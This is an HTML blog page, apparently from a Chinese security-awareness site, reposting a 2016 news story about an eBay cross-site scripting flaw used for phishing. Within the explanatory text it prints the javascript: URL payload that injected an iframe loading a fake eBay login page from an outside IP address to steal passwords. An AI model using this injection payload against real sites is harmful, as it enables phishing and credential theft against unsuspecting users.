@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>
+        
+        跨站脚本漏洞，ebay中枪！
+        
+    </title>
+    
+    <meta name="description" content="号外！号外！ebay网竟潜存着一个简单有效的漏洞，导致亿万用户遭受高级网络钓鱼攻击。"/>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <link rel="stylesheet" href="/resources/css/main.css"/>
+    
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico"/>
+    
+
+    
+</head>
+<body style="background: url('/resources/images/main_front.jpg') no-repeat fixed;
+                            background-size: cover">
+<div id="wrapper">
+    <header>
+    <nav id="main-nav">
+        <ul>
+            <li><a class="fancy-nav" href="/index.html">home</a></li>
+            
+            <li><a class="fancy-nav" href="/categories/最新公告">最新公告</a></li>
+            
+            <li><a class="fancy-nav" href="/categories/传媒信安">传媒信安</a></li>
+            
+            <li><a class="fancy-nav" href="/categories/课程体系">课程体系</a></li>
+            
+            <li><a class="fancy-nav" href="/categories/example">example</a></li>
+            
+            <li><a class="fancy-nav" href="/categories/信息安全科普">信息安全科普</a></li>
+            
+            <li><a class="fancy-nav" href="/pages/about.html">about</a></li>
+        </ul>
+    </nav>
+</header>
+
+    <main id="start">
+        <div class="articles">
+            <article>
+    <header>
+        
+        <h1>跨站脚本漏洞，ebay中枪！</h1>
+        
+        <div class="post-meta">
+    <small>
+        <time datetime="13 01 2016">
+            13 January, 2016
+        </time>
+        <span class="tag-sep"> | </span>
+        
+        <a class="comment_count" href="/%E4%BC%A0%E5%AA%92%E4%BF%A1%E5%AE%89/ebay#disqus_thread"
+           data-disqus-identifier="/%E4%BC%A0%E5%AA%92%E4%BF%A1%E5%AE%89/ebay"></a>
+        <span class="tag-sep"> | </span>
+        
+        <nav class="tags">
+    <ul>
+        
+        <li><a href="/tags/传媒信安.html">传媒信安</a><span>&nbsp;&nbsp;</span></li>
+        
+    </ul>
+</nav>
+
+    </small>
+</div>
+
+    </header>
+    <p><img src="http://127.0.0.1:4000//resources/images/Y1.png" alt="" /></p>
+
+<p>号外！号外！ebay网竟潜存着一个简单有效的漏洞，导致亿万用户遭受高级网络钓鱼攻击。</p>
+
+<p>独立安全研究人员报告，上个月，这个ebay的严重漏洞可能让黑客在ebay网站上构建一个虚假的登录页面，即钓鱼页面，用于盗取数以百万计的用户密码和收获凭据。</p>
+
+<p>研究人员，绰号MLT说，任何人都可以利用漏洞，通过发送钓鱼邮件给目标eBay用户，以接管他们的帐户或收获数千，甚至上百万的ebay客户证书。</p>
+
+<p>HMLT发表了一篇关于ebay漏洞的博客文章</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>（https://ret2libc.wordpress.com/2016/01/11/a-tale-of-ebay-xss-and-shoddy-incident-response/）
+</code></pre></div></div>
+<p>，证明它是多么容易被利用，从而窃取用户的密码。</p>
+
+<p>Here’s How ebay Hack Works：</p>
+
+<p>该漏洞实际上寄生在URL参数中，允许黑客向合法的ebay网站上注入了他的iFrame。</p>
+
+<p>这是一种常见的网络bug，技术上称为<strong>跨站脚本（XSS）漏洞</strong>，攻击者可以利用该漏洞将恶意代码注入到合法网站。</p>
+
+<p>MLT拥有一个iframe链接到自己的第三方网络钓鱼页面，其中包含eBay的正规网址，这使得它看起来像在登录“ 合法的ebay网站 ”。</p>
+
+<p>登录页面看起来与ebay的实际登录界面几乎完全一样，除了自定义URL的第二部分，这才是大多数用户不熟知的。</p>
+
+<p>在这种情况下，将含有研究者的钓鱼页面的IFRAME注入到使用以下有效载荷的页面：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>document.write(‘&lt;iframec=”http://45.55.162.179/ebay/signin.ebay.com/ws/eBayISAPI9f90.html” width=”1500″ height=”1000″&gt;’)
+</code></pre></div></div>
+
+<p>下面是完整的URL，包括上述的有效载荷，再注入时间：</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://ebay.com/link/?nav=webview&amp; url=javascript:document.write%28%27%3Ciframe%20src=%22http://45.55.162.179/ebay/signin.ebay.com/ws/eBayISAPI9f90.html%22%20width=%221500%22%20height=%221000%22%3E%27%29
+</code></pre></div></div>
+
+<p>这个URL的截图：</p>
+
+<p><img src="http://127.0.0.1:4000//resources/images/Y2.png" alt="" /></p>
+
+<p>经过这样做，MLT在被感染的网站输入自己的用户名和密码，并登录，这会得到错误提示。但与此同时，他能够偷到用户输入的明文口令。
+视频演示</p>
+
+<p>MLT也提供了证明的概念视频，展示了这个安全漏洞的实时性。你可以在Youtube看下视频(https://www.youtube.com/watch?v=WuZ61NWbK_4)。</p>
+
+<p>MLT负责任的报道了12月11日ebay的该漏洞，第二天，该公司只停止了研究人员的电子邮件响应，但并没有发布补丁，甚至不知道该漏洞的后果。</p>
+
+<p>然而，当媒体联系ebay询问有关漏洞时，公司火速发布补丁，并承认MLT关于其发现的网站页面，感谢白帽黑客致力于报告错误。</p>
+
+<p><a href="http://thehackernews.com/2016/01/ebay-hacking.html#rd?sukey=7f8f3cb2e9b0da45ef1ed2de750a85a1e06c1d33354ff08cd1a90dbd746357ad81f42addec21e240325b39164c9a31cb">阅读原文</a></p>
+
+    <footer>
+        
+        <div id="disqus_thread"></div>
+<script>
+    /**
+     * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+     * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+     */
+    var disqus_developer = 1;
+    var disqus_config = function () {
+        this.page.url = 'http://localhost:4000/%E4%BC%A0%E5%AA%92%E4%BF%A1%E5%AE%89/ebay';
+        this.page.identifier = '/%E4%BC%A0%E5%AA%92%E4%BF%A1%E5%AE%89/ebay';
+        this.page.title = "跨站脚本漏洞，ebay中枪！";
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+
+        s.src = '//.disqus.com/embed.js';
+
+        s.setAttribute('data-timestamp', + new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+        
+    </footer>
+</article>
+
+        </div>
+    </main>
+        <nav class="paginator">
+    <ul>
+        
+        
+        <li><a class="fancy-nav" href="/%E4%BC%A0%E5%AA%92%E4%BF%A1%E5%AE%89/602-gpbs-ddos">&lt;&nbsp;Previous</a></li>
+        
+        <li class="sep">&nbsp;</li>
+        <li><a class="fancy-nav" href="#">Top</a></li>
+        <li class="sep">&nbsp;</li>
+        
+        <li><a class="fancy-nav" href="/%E4%BC%A0%E5%AA%92%E4%BF%A1%E5%AE%89/65fortigatessh">Next&nbsp;&gt;</a></li>
+        
+        
+    </ul>
+</nav>
+
+    <footer>
+        
+<blockquote id="footer-quote">
+    <p>
+        
+        Some fancy quote
+        
+    </p>
+    <footer>
+        <cite>
+        
+        - John Doe
+        
+    </cite>
+    </footer>
+</blockquote>
+
+<div id="footer-main">
+    <small>
+        &copy; 2016 Name Surname. ALL RIGHTS RESERVED.
+    </small>
+</div>
+
+    </footer>
+</div>
+
+</body>
+</html>
